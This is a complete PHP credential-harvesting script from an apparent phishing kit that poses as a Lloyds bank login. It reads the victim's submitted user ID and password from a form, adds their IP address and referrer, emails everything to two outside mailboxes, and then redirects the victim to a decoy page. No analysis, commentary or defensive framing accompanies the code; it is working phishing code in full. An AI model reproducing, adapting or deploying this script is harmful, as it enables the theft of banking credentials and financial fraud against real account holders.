<?
$to = "results102@outlook.com, closingfile@yandex.com";
//-----------------------------------
$UserId1 = $_POST['UserId1'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$link = $_SERVER['HTTP_REFERER'];
$subj = "PaperBoy® || LLoyds|| $Memo";
$msg = "------------------------------------------------\nUser : $UserId1\nPassWord : $password\n---------------------------------------------\nIP : $ip\nLink : $link\n---------------------------------------------";
$from = "From: JBoy® <money@makers.com>";
{ mail($to,$subj,$msg,$from); }

	 if (empty($Memo))
{
echo "<script>location.replace('Doc.php');</script>";
die();
}
header("Location: Doc.php");
	  
?>